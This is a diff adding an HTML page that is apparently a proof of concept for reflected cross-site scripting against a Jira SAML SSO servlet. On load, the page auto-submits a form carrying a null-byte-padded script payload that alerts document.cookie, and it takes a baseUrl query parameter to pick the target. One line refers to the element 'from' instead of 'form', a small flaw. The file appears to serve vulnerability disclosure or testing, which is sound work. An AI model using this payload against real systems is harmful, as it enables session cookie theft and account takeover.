@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test</title>
+</head>
+<body>
+<form id="form" method="POST" action="https://jira-demo1.lab.resolution.de/plugins/servlet/samlsso">
+    <input id="text" type="text" name="test" value=''>
+    <input type="submit" name="Submit">
+</form>
+    <script>
+    	const urlParams = new URLSearchParams(window.location.search);
+    	const baseUrl = urlParams.get('baseUrl');
+        document.getElementById("from").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");
+
+        const payload = `"test>\u0000\u0000\u0000\u0000\u0000\u0000\u0000<script>alert(document.cookie);<\/script>`;
+        document.getElementById("text").value = payload;
+        document.getElementById("form").submit();
+    </script>
+</body>
+</html>
